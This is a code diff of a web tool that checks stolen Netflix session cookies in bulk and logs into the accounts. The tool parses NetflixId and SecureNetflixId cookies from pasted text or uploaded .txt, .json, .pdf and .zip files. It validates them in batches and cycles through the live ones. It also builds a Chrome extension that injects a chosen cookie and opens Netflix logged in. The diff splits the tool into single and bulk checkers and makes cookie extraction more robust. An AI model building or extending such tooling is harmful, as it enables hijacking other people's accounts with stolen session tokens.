@@ -42,16 +42,15 @@ button.red{background:var(--nf);color:#fff;box-shadow:0 0 22px rgba(229,9,20,.65
 button.red:hover{box-shadow:0 0 34px rgba(229,9,20,.95);transform:translateY(-1px)}
 button.ghost{background:transparent;color:var(--cy);border:1px solid var(--cy);box-shadow:none}
 button.ghost.mg{color:var(--mg);border-color:var(--mg)}
-button.green{background:#00ff88;color:#000;box-shadow:0 0 18px rgba(0,255,136,.45)}
 button:disabled{opacity:.35;cursor:not-allowed}
 
 .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
 .grid2 button{margin-top:0}
 
-.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
-.stat{border:1px solid var(--line);border-radius:12px;padding:12px;text-align:center;background:linear-gradient(180deg,rgba(0,240,255,.05),transparent)}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px;margin-bottom:4px}
+.stat{border:1px solid var(--line);border-radius:12px;padding:10px;text-align:center;background:linear-gradient(180deg,rgba(0,240,255,.05),transparent)}
 .stat .k{font-size:9px;letter-spacing:.3em;color:#7a8399}
-.stat .v{font-size:22px;font-weight:900;margin-top:4px;color:var(--cy);text-shadow:0 0 14px rgba(0,240,255,.6)}
+.stat .v{font-size:18px;font-weight:900;margin-top:3px;color:var(--cy);text-shadow:0 0 14px rgba(0,240,255,.6)}
 .stat.bad .v{color:var(--mg);text-shadow:0 0 14px rgba(255,43,214,.6)}
 
 #status{margin-top:10px;font-size:12px;font-weight:700;letter-spacing:.05em;padding:11px;border-radius:10px;display:none;text-align:center}
@@ -69,7 +68,7 @@ button:disabled{opacity:.35;cursor:not-allowed}
 .bar{height:100%;width:0;background:linear-gradient(90deg,var(--cy),var(--mg));transition:width .2s;box-shadow:0 0 14px var(--cy)}
 .ptext{font-size:10px;color:#7a8399;text-align:center;letter-spacing:.15em}
 
-.rotate{display:none;border:1px solid rgba(255,43,214,.25);border-radius:12px;padding:14px;margin-bottom:14px;background:linear-gradient(180deg,rgba(255,43,214,.05),transparent)}
+.rotate{display:none;border:1px solid rgba(255,43,214,.25);border-radius:12px;padding:14px;margin-top:12px;background:linear-gradient(180deg,rgba(255,43,214,.05),transparent)}
 .rotate.on{display:block}
 .rcount{text-align:center;font-size:14px;font-weight:900;color:#fff;letter-spacing:.2em}
 .rprof{text-align:center;font-size:10px;color:var(--cy);letter-spacing:.15em;margin:6px 0;word-break:break-all}
@@ -87,12 +86,6 @@ button:disabled{opacity:.35;cursor:not-allowed}
 .guide-step .title{color:var(--cy);font-size:12px;font-weight:800;letter-spacing:.08em;margin-bottom:4px}
 .guide-step .desc{color:#b7c6dd;font-size:11px;line-height:1.5}
 .guide-step code{background:#04050a;border:1px solid var(--line);border-radius:4px;padding:1px 6px;color:#9fe9ff;font-size:10px;word-break:break-all}
-
-.ext-status{display:flex;align-items:center;gap:10px;padding:11px;border-radius:10px;margin-bottom:12px;font-size:11px;letter-spacing:.08em;font-weight:700}
-.ext-status.ok{background:rgba(0,255,136,.08);border:1px solid #00ff88;color:#00ff88}
-.ext-status.no{background:rgba(255,43,214,.08);border:1px solid var(--mg);color:var(--mg)}
-.ext-status.wait{background:rgba(255,214,0,.06);border:1px solid #ffd600;color:#ffd600}
-.ext-dot{width:9px;height:9px;border-radius:50%;background:currentColor;box-shadow:0 0 12px currentColor}
 
 .hist-item{border:1px solid var(--line);border-radius:10px;padding:10px;margin-bottom:8px;font-size:10px;color:#b7c6dd;cursor:pointer;transition:border-color .2s,background .2s;position:relative}
 .hist-item:hover{border-color:var(--cy);background:rgba(0,240,255,.05)}
@@ -132,20 +125,34 @@ button:disabled{opacity:.35;cursor:not-allowed}
   </div>
   <div class="clock" id="clock">CORE: BYPASS</div>
 
+  <!-- ============ SINGLE ============ -->
   <div class="panel">
     <h2>SINGLE COOKIE CHECKER</h2>
-    <textarea id="singleInput" placeholder="paste netflix cookie here (any format)"></textarea>
+    <textarea id="singleInput" placeholder="paste single cookie here (any format)"></textarea>
     <button onclick="checkSingle()">CHECK COOKIE</button>
     <div id="status"></div>
+
+    <div class="stats">
+      <div class="stat"><div class="k">S-VALID</div><div class="v" id="sValid">0</div></div>
+      <div class="stat bad"><div class="k">S-INVALID</div><div class="v" id="sInvalid">0</div></div>
+    </div>
+
+    <div class="rotate" id="singleRotate">
+      <div class="rcount"><span id="sRotCurrent">1</span> / <span id="sRotTotal">0</span></div>
+      <div class="rprof" id="sRotProfile"></div>
+      <div class="rcookie" id="sRotCookie"></div>
+      <button class="mg" onclick="copySingle()">COPY THIS COOKIE</button>
+      <button class="red" onclick="loginSingle()">LOGIN TO NETFLIX</button>
+      <div class="grid2" style="margin-top:9px">
+        <button class="ghost" onclick="prevSingle()">← PREV</button>
+        <button class="ghost mg" onclick="nextSingle()">NEXT →</button>
+      </div>
+    </div>
   </div>
 
-  <div class="stats">
-    <div class="stat"><div class="k">VALID</div><div class="v" id="validCount">0</div></div>
-    <div class="stat bad"><div class="k">INVALID</div><div class="v" id="invalidCount">0</div></div>
-  </div>
-
+  <!-- ============ BULK ============ -->
   <div class="panel">
-    <h2>BULK UPLOAD</h2>
+    <h2>BULK COOKIE CHECKER</h2>
     <label class="upload">
       <button class="ghost" type="button">UPLOAD FILES (.txt / .json / .pdf / .zip)</button>
       <input type="file" id="fileInput" accept=".txt,.json,.pdf,.zip" multiple onchange="uploadFile(event)">
@@ -153,18 +160,22 @@ button:disabled{opacity:.35;cursor:not-allowed}
     <div class="loader" id="loader">scanning...</div>
     <div class="progress" id="progress"><div class="bar" id="progressBar"></div></div>
     <div class="ptext" id="progressText"></div>
-  </div>
 
-  <div class="rotate" id="rotateBox">
-    <h2 style="font-size:11px;letter-spacing:.3em;color:var(--mg);margin:0 0 10px;display:flex;align-items:center;gap:8px"><span style="width:6px;height:6px;background:var(--mg);border-radius:50%;box-shadow:0 0 10px var(--mg)"></span>VALID COOKIE ROTATION</h2>
-    <div class="rcount"><span id="rotCurrent">1</span> / <span id="rotTotal">0</span></div>
-    <div class="rprof" id="rotProfile"></div>
-    <div class="rcookie" id="rotCookie"></div>
-    <button class="mg" onclick="copyCurrent()">COPY THIS COOKIE</button>
-    <button class="red" onclick="loginNetflix()">LOGIN TO NETFLIX</button>
-    <div class="grid2" style="margin-top:9px">
-      <button class="ghost" onclick="prevCookie()">← PREV</button>
-      <button class="ghost mg" onclick="nextCookie()">NEXT →</button>
+    <div class="stats">
+      <div class="stat"><div class="k">B-VALID</div><div class="v" id="bValid">0</div></div>
+      <div class="stat bad"><div class="k">B-INVALID</div><div class="v" id="bInvalid">0</div></div>
+    </div>
+
+    <div class="rotate" id="bulkRotate">
+      <div class="rcount"><span id="bRotCurrent">1</span> / <span id="bRotTotal">0</span></div>
+      <div class="rprof" id="bRotProfile"></div>
+      <div class="rcookie" id="bRotCookie"></div>
+      <button class="mg" onclick="copyBulk()">COPY THIS COOKIE</button>
+      <button class="red" onclick="loginBulk()">LOGIN TO NETFLIX</button>
+      <div class="grid2" style="margin-top:9px">
+        <button class="ghost" onclick="prevBulk()">← PREV</button>
+        <button class="ghost mg" onclick="nextBulk()">NEXT →</button>
+      </div>
     </div>
   </div>
 
@@ -227,11 +238,6 @@ button:disabled{opacity:.35;cursor:not-allowed}
       <div class="step-text">Popup mein cookie paste karo (long-press → paste) → <b>INJECT</b> tap karo. Netflix khul jaayega logged in.</div>
     </div>
 
-    <div class="copy-step">
-      <div class="step-label">ALTERNATIVE — LOGIN BUTTON</div>
-      <div class="step-text">Agar extension panel se connect ho jaaye (EXT: READY), to <b>LOGIN TO NETFLIX</b> ek click mein kaam karega. Warna upar wale 4 steps use karo.</div>
-    </div>
-
     <button class="mg" onclick="closeGuide()">CLOSE</button>
   </div>
 </div>
@@ -274,12 +280,16 @@ button:disabled{opacity:.35;cursor:not-allowed}
   setInterval(draw,50);
 })();
 
-/* ===== STATE ===== */
-var validCookies=[];
-var invalidCookies=[];
-var lastValidCookie='';
+/* ===== SEPARATE STATE ===== */
+var singleValid=[];
+var singleInvalid=[];
+var singleIndex=0;
+
+var bulkValid=[];
+var bulkInvalid=[];
+var bulkIndex=0;
+
 var allChunks=[];
-var rotIndex=0;
 var extReady=false;
 
 /* ===== CLOCK ===== */
@@ -290,56 +300,35 @@ setInterval(setClock,1000);setClock();
 function setExtUI(state){
   var pill=document.getElementById('extPill');
   pill.className='pill';
-  if(state==='ready'){
-    extReady=true;
-    pill.classList.add('ok');
-    pill.textContent='EXT: READY';
-  }else if(state==='missing'){
-    extReady=false;
-    pill.classList.add('no');
-    pill.textContent='EXT: MANUAL';
-  }else{
-    extReady=false;
-    pill.classList.add('no');
-    pill.textContent='EXT: —';
-  }
+  if(state==='ready'){extReady=true;pill.classList.add('ok');pill.textContent='EXT: READY';}
+  else if(state==='missing'){extReady=false;pill.classList.add('no');pill.textContent='EXT: MANUAL';}
+  else{extReady=false;pill.classList.add('no');pill.textContent='EXT: —';}
 }
-
 function checkExt(){
   setExtUI('wait');
-  if(typeof chrome==='undefined' || !chrome.runtime || !chrome.runtime.sendMessage){
-    setExtUI('missing');
-    return;
-  }
+  if(typeof chrome==='undefined' || !chrome.runtime || !chrome.runtime.sendMessage){setExtUI('missing');return;}
   try{
     chrome.runtime.sendMessage({action:'ping'}, function(resp){
-      if(chrome.runtime.lastError || !resp || !resp.ok){
-        setExtUI('missing');
-      }else{
-        setExtUI('ready');
-      }
+      if(chrome.runtime.lastError || !resp || !resp.ok){setExtUI('missing');}
+      else{setExtUI('ready');}
     });
     setTimeout(function(){
-      if(!extReady && document.getElementById('extPill').textContent==='EXT: —'){
-        setExtUI('missing');
-      }
+      if(!extReady && document.getElementById('extPill').textContent==='EXT: —'){setExtUI('missing');}
     },1500);
-  }catch(e){
-    setExtUI('missing');
-  }
+  }catch(e){setExtUI('missing');}
 }
 window.addEventListener('load',function(){checkExt()});
 
-/* ===== COOKIE EXTRACTOR ===== */
+/* ===== EXTRACT ===== */
 function extract(raw){
   if(!raw) return '';
   var keep=['netflixid','securenetflixid','nfvdid'];
   var out={};
+
   var lines=raw.split('\n');
   for(var i=0;i<lines.length;i++){
-    var line=lines[i];
-    if(!line.trim()) continue;
-    if(line.charAt(0)==='#') continue;
+    var line=lines[i].replace(/\r$/,'');
+    if(!line.trim()||line.charAt(0)==='#') continue;
     var cells=line.split('\t');
     if(cells.length>=7){
       var nm=cells[5]?cells[5].trim():'';
@@ -348,19 +337,19 @@ function extract(raw){
       if(keep.indexOf(low)>=0 && val) out[low]=nm+'='+val;
     }
   }
-  if(Object.keys(out).length===0){
-    var parts=raw.split(/[;\n]/);
+  if(Object.keys(out).length<3){
+    var parts=raw.split(/;\s*/);
     for(var j=0;j<parts.length;j++){
-      var p=parts[j].trim();
+      var p=parts[j].trim().replace(/^[;\n]+/,'');
       if(!p) continue;
       var eq=p.indexOf('=');
       if(eq<0) continue;
       var k=p.substring(0,eq).trim().toLowerCase();
-      var v=p.substring(eq+1).trim();
+      var v=p.substring(eq+1).trim().replace(/[;\n]+$/,'').trim();
       if(keep.indexOf(k)>=0 && v) out[k]=p.substring(0,eq).trim()+'='+v;
     }
   }
-  if(Object.keys(out).length===0){
+  if(Object.keys(out).length<3){
     try{
       var obj=JSON.parse(raw);
       if(Array.isArray(obj)){
@@ -376,6 +365,19 @@ function extract(raw){
       }
     }catch(e){}
   }
+  if(Object.keys(out).length<3){
+    for(var s=0;s<keep.length;s++){
+      var kk=keep[s];
+      if(out[kk]) continue;
+      var re=new RegExp(kk+'\\s*=\\s*([^;\\n]+)','i');
+      var match=raw.match(re);
+      if(match && match[1]){
+        var name=kk==='netflixid'?'NetflixId':(kk==='securenetflixid'?'SecureNetflixId':'nfvdid');
+        out[kk]=name+'='+match[1].trim();
+      }
+    }
+  }
+
   var arr=[];
   if(out['netflixid']) arr.push(out['netflixid']);
   if(out['securenetflixid']) arr.push(out['securenetflixid']);
@@ -423,7 +425,7 @@ async function validate(cookie){
   }catch(e){ return {ok:false,error:e.message} }
 }
 
-/* ===== SINGLE CHECK ===== */
+/* ================= SINGLE ================= */
 async function checkSingle(){
   var input=document.getElementById('singleInput').value.trim();
   var status=document.getElementById('status');
@@ -433,22 +435,54 @@ async function checkSingle(){
   status.className='wait';status.textContent='checking...';
   var r=await validate(norm);
   if(r.ok){
-    lastValidCookie=norm;
-    validCookies=[{cookie:norm,profile:r.profile}];
-    invalidCookies=[];
-    rotIndex=0;
+    singleValid=[{cookie:norm,profile:r.profile}];
+    singleInvalid=[];
+    singleIndex=0;
     status.className='ok';status.textContent='LIVE — '+r.profile;
-    document.getElementById('validCount').textContent='1';
-    document.getElementById('invalidCount').textContent='0';
-    showRotate();
+    document.getElementById('sValid').textContent='1';
+    document.getElementById('sInvalid').textContent='0';
+    showSingleRotate();
     saveHistory({time:Date.now(),src:'single',valid:true,cookie:norm,profile:r.profile,error:''});
   }else{
     status.className='bad';status.textContent='DEAD — '+r.error;
+    singleValid=[];
+    singleInvalid=[{cookie:norm,error:r.error}];
+    document.getElementById('sValid').textContent='0';
+    document.getElementById('sInvalid').textContent='1';
+    document.getElementById('singleRotate').classList.remove('on');
     saveHistory({time:Date.now(),src:'single',valid:false,cookie:norm,profile:'',error:r.error});
   }
 }
 
-/* ===== FILE READ ===== */
+function showSingleRotate(){
+  var box=document.getElementById('singleRotate');
+  if(!singleValid.length){box.classList.remove('on');return}
+  box.classList.add('on');
+  updateSingleRotate();
+}
+function updateSingleRotate(){
+  if(!singleValid.length) return;
+  var c=singleValid[singleIndex];
+  document.getElementById('sRotCurrent').textContent=(singleIndex+1);
+  document.getElementById('sRotTotal').textContent=singleValid.length;
+  document.getElementById('sRotProfile').textContent=c.profile||'?';
+  document.getElementById('sRotCookie').textContent=c.cookie;
+}
+function nextSingle(){if(!singleValid.length)return;singleIndex=(singleIndex+1)%singleValid.length;updateSingleRotate();}
+function prevSingle(){if(!singleValid.length)return;singleIndex=(singleIndex-1+singleValid.length)%singleValid.length;updateSingleRotate();}
+function copySingle(){
+  if(!singleValid.length) return;
+  var c=singleValid[singleIndex].cookie;
+  if(navigator.clipboard) navigator.clipboard.writeText(c).then(function(){alert('copied')}).catch(function(){alert(c)});
+  else alert(c);
+}
+function loginSingle(){
+  if(!singleValid.length){alert('pehle check karo');return}
+  var cookie=singleValid[singleIndex].cookie;
+  doLogin(cookie);
+}
+
+/* ================= BULK ================= */
 async function readFileContent(file){
   if(file.name.toLowerCase().endsWith('.pdf')){
     var buf=await file.arrayBuffer();
@@ -464,7 +498,6 @@ async function readFileContent(file){
   return await file.text();
 }
 
-/* ===== BULK UPLOAD ===== */
 async function uploadFile(event){
   var files=event.target.files;
   if(!files.length) return;
@@ -510,106 +543,74 @@ async function uploadFile(event){
     finalChunks.push(norm);
   }
   loader.textContent='validating '+finalChunks.length+' cookies...';
-  validCookies=[];invalidCookies=[];
+  bulkValid=[];bulkInvalid=[];
   var batchSize=5;
   for(var b=0;b<finalChunks.length;b+=batchSize){
     var batch=finalChunks.slice(b,b+batchSize);
     var results=await Promise.all(batch.map(function(c){return validate(c)}));
     for(var r=0;r<results.length;r++){
       if(results[r].ok){
-        validCookies.push({cookie:batch[r],profile:results[r].profile});
+        bulkValid.push({cookie:batch[r],profile:results[r].profile});
         saveHistory({time:Date.now(),src:'bulk',valid:true,cookie:batch[r],profile:results[r].profile,error:''});
       }else{
-        invalidCookies.push({cookie:batch[r],error:results[r].error});
+        bulkInvalid.push({cookie:batch[r],error:results[r].error});
         saveHistory({time:Date.now(),src:'bulk',valid:false,cookie:batch[r],profile:'',error:results[r].error});
       }
     }
     var done=Math.min(b+batchSize,finalChunks.length);
     var pct=Math.round((done/finalChunks.length)*100);
     progressBar.style.width=pct+'%';
-    progressText.textContent='scanned '+done+'/'+finalChunks.length+' — '+validCookies.length+' valid';
+    progressText.textContent='scanned '+done+'/'+finalChunks.length+' — '+bulkValid.length+' valid';
   }
   loader.classList.remove('on');
   progress.classList.remove('on');
-  document.getElementById('validCount').textContent=validCookies.length;
-  document.getElementById('invalidCount').textContent=invalidCookies.length;
-  if(validCookies.length>0){
-    lastValidCookie=validCookies[0].cookie;
-    rotIndex=0;
-    showRotate();
+  document.getElementById('bValid').textContent=bulkValid.length;
+  document.getElementById('bInvalid').textContent=bulkInvalid.length;
+  if(bulkValid.length>0){
+    bulkIndex=0;
+    showBulkRotate();
   }
 }
 
-/* ===== ROTATION ===== */
-function showRotate(){
-  var box=document.getElementById('rotateBox');
-  if(!validCookies.length){box.classList.remove('on');return}
+function showBulkRotate(){
+  var box=document.getElementById('bulkRotate');
+  if(!bulkValid.length){box.classList.remove('on');return}
   box.classList.add('on');
-  updateRotate();
+  updateBulkRotate();
+}
+function updateBulkRotate(){
+  if(!bulkValid.length) return;
+  var c=bulkValid[bulkIndex];
+  document.getElementById('bRotCurrent').textContent=(bulkIndex+1);
+  document.getElementById('bRotTotal').textContent=bulkValid.length;
+  document.getElementById('bRotProfile').textContent=c.profile||'?';
+  document.getElementById('bRotCookie').textContent=c.cookie;
+}
+function nextBulk(){if(!bulkValid.length)return;bulkIndex=(bulkIndex+1)%bulkValid.length;updateBulkRotate();}
+function prevBulk(){if(!bulkValid.length)return;bulkIndex=(bulkIndex-1+bulkValid.length)%bulkValid.length;updateBulkRotate();}
+function copyBulk(){
+  if(!bulkValid.length) return;
+  var c=bulkValid[bulkIndex].cookie;
+  if(navigator.clipboard) navigator.clipboard.writeText(c).then(function(){alert('copied')}).catch(function(){alert(c)});
+  else alert(c);
+}
+function loginBulk(){
+  if(!bulkValid.length){alert('pehle bulk check karo');return}
+  var cookie=bulkValid[bulkIndex].cookie;
+  doLogin(cookie);
 }
 
-function updateRotate(){
-  if(!validCookies.length) return;
-  var c=validCookies[rotIndex];
-  document.getElementById('rotCurrent').textContent=(rotIndex+1);
-  document.getElementById('rotTotal').textContent=validCookies.length;
-  document.getElementById('rotProfile').textContent=c.profile||'?';
-  document.getElementById('rotCookie').textContent=c.cookie;
-  lastValidCookie=c.cookie;
-}
-
-function nextCookie(){
-  if(!validCookies.length) return;
-  rotIndex=(rotIndex+1)%validCookies.length;
-  updateRotate();
-}
-
-function prevCookie(){
-  if(!validCookies.length) return;
-  rotIndex=(rotIndex-1+validCookies.length)%validCookies.length;
-  updateRotate();
-}
-
-function copyCurrent(){
-  if(!validCookies.length) return;
-  var c=validCookies[rotIndex].cookie;
-  if(navigator.clipboard){
-    navigator.clipboard.writeText(c).then(function(){alert('cookie #'+(rotIndex+1)+' copied')}).catch(function(){alert(c)});
-  }else{
-    alert(c);
-  }
-}
-
-/* ===== LOGIN TO NETFLIX ===== */
-function loginNetflix(){
-  var cookie='';
-  if(validCookies && validCookies.length>0){
-    cookie=validCookies[rotIndex].cookie;
-  }else if(lastValidCookie){
-    cookie=lastValidCookie;
-  }else{
-    alert('pehle cookie check karo');
-    return;
-  }
-
-  /* Step 1: cookie clipboard mein copy karo */
-  if(navigator.clipboard){
-    navigator.clipboard.writeText(cookie).catch(function(){});
-  }
-
-  /* Step 2: extension available hai? inject karo */
+/* ================= LOGIN ================= */
+function doLogin(cookie){
+  if(navigator.clipboard) navigator.clipboard.writeText(cookie).catch(function(){});
   if(extReady && typeof chrome!=='undefined' && chrome.runtime && chrome.runtime.sendMessage){
     try{
       chrome.runtime.sendMessage({action:'inject', cookie:cookie}, function(resp){
-        if(chrome.runtime.lastError || !resp || !resp.ok){
-          openGuide();
-        }
+        if(chrome.runtime.lastError || !resp || !resp.ok){openGuide();}
       });
       return;
     }catch(e){}
   }
-
-  /* Step 3: extension nahi — guide kholo */
   openGuide();
 }
 
@@ -634,14 +635,15 @@ function downloadExt(){
     "if(!req){sendResponse({ok:false});return;}\n" +
     "if(req.action==='ping'){sendResponse({ok:true,version:'1.2'});return;}\n" +
     "if(req.action!=='inject'){sendResponse({ok:false});return;}\n" +
-    "var parts=(req.cookie||'').split(';').map(function(p){return p.trim()}).filter(Boolean);\n" +
-    "var done=0,total=parts.length;\n" +
+    "var parts=(req.cookie||'').split(/[;\\n]+/).map(function(p){return p.trim()}).filter(Boolean);\n" +
+    "var done=0,total=parts.length,ok=0;\n" +
     "if(!total){sendResponse({ok:false});return;}\n" +
     "function finish(){if(++done>=total){chrome.tabs.create({url:'https://www.netflix.com/browse'});sendResponse({ok:true});}}\n" +
     "parts.forEach(function(p){\n" +
     "var eq=p.indexOf('=');\n" +
     "if(eq<0){finish();return;}\n" +
     "var name=p.substring(0,eq).trim(),value=p.substring(eq+1).trim();\n" +
+    "if(!name||!value){finish();return;}\n" +
     "chrome.cookies.set({url:'https://www.netflix.com/',name:name,value:value,domain:'.netflix.com',path:'/',secure:true,sameSite:'no_restriction',expirationDate:Math.floor(Date.now()/1000)+2592000},function(){finish();});\n" +
     "});\n" +
     "}\n" +
@@ -654,20 +656,21 @@ function downloadExt(){
     "var r=document.getElementById('c').value.trim();\n" +
     "var s=document.getElementById('s');\n" +
     "if(!r){s.textContent='no cookie';return}\n" +
-    "var parts=r.split(/[;\\n]/);\n" +
+    "var parts=r.split(/[;\\n]+/).map(function(p){return p.trim()}).filter(Boolean);\n" +
     "var total=parts.length,done=0,ok=0;\n" +
     "parts.forEach(function(p){\n" +
     "var eq=p.indexOf('=');\n" +
-    "if(eq<0){done++;return;}\n" +
+    "if(eq<0){done++;if(done>=total)finish();return;}\n" +
     "var n=p.substring(0,eq).trim();\n" +
     "var v=p.substring(eq+1).trim();\n" +
-    "if(!n||!v){done++;return;}\n" +
+    "if(!n||!v){done++;if(done>=total)finish();return;}\n" +
     "chrome.cookies.set({url:'https://www.netflix.com/',name:n,value:v,domain:'.netflix.com',path:'/',secure:true,sameSite:'no_restriction',expirationDate:Math.floor(Date.now()/1000)+2592000},function(){\n" +
     "ok++;done++;\n" +
-    "s.textContent=ok+' set';\n" +
-    "if(done>=total){setTimeout(function(){chrome.tabs.create({url:'https://www.netflix.com/browse'});window.close()},500)}\n" +
+    "s.textContent=ok+' of '+total+' set';\n" +
+    "if(done>=total)finish();\n" +
     "});\n" +
     "});\n" +
+    "function finish(){s.textContent=ok+' of '+total+' set — opening netflix...';setTimeout(function(){chrome.tabs.create({url:'https://www.netflix.com/browse'});window.close()},800);}\n" +
     "};";
 
   var zip=new JSZip();
@@ -685,26 +688,10 @@ function downloadExt(){
 
 /* ===== HISTORY ===== */
 var HIST_KEY='nf_hist_v2';
-
-function loadHistory(){
-  try{return JSON.parse(localStorage.getItem(HIST_KEY)||'[]')}catch(e){return[]}
-}
-function saveHistory(entry){
-  var h=loadHistory();
-  h.unshift(entry);
-  if(h.length>200) h=h.slice(0,200);
-  localStorage.setItem(HIST_KEY,JSON.stringify(h));
-}
-function clearHistory(){
-  if(!confirm('clear all history?')) return;
-  localStorage.removeItem(HIST_KEY);
-  renderHistory();
-}
-function escapeHtml(s){
-  return String(s||'').replace(/[&<>"']/g,function(c){
-    return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
-  });
-}
+function loadHistory(){try{return JSON.parse(localStorage.getItem(HIST_KEY)||'[]')}catch(e){return[]}}
+function saveHistory(entry){var h=loadHistory();h.unshift(entry);if(h.length>200)h=h.slice(0,200);localStorage.setItem(HIST_KEY,JSON.stringify(h));}
+function clearHistory(){if(!confirm('clear all history?'))return;localStorage.removeItem(HIST_KEY);renderHistory();}
+function escapeHtml(s){return String(s||'').replace(/[&<>"']/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];});}
 function renderHistory(){
   var list=document.getElementById('historyList');
   var h=loadHistory();
@@ -732,29 +719,24 @@ function openHistoryItem(idx){
   input.value=e.cookie;
   hideHistory();
   if(e.valid){
-    lastValidCookie=e.cookie;
-    validCookies=[{cookie:e.cookie,profile:e.profile||'?'}];
-    invalidCookies=[];
-    rotIndex=0;
-    document.getElementById('validCount').textContent='1';
-    document.getElementById('invalidCount').textContent='0';
+    singleValid=[{cookie:e.cookie,profile:e.profile||'?'}];
+    singleInvalid=[];
+    singleIndex=0;
+    document.getElementById('sValid').textContent='1';
+    document.getElementById('sInvalid').textContent='0';
     var st=document.getElementById('status');
     st.className='ok';st.textContent='LIVE — '+(e.profile||'?');
-    showRotate();
+    showSingleRotate();
   }else{
     var st2=document.getElementById('status');
     st2.className='bad';st2.textContent='DEAD — '+(e.error||'?');
   }
   window.scrollTo({top:0,behavior:'smooth'});
 }
-function showHistory(){
-  renderHistory();
-  document.getElementById('historyModal').classList.add('on');
-}
+function showHistory(){renderHistory();document.getElementById('historyModal').classList.add('on');}
 function hideHistory(){document.getElementById('historyModal').classList.remove('on')}
 
-/* ===== PDF WORKER ===== */
 if(window.pdfjsLib) pdfjsLib.GlobalWorkerOptions.workerSrc='https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js';
 </script>
 </body>
-</html>
+  </html>
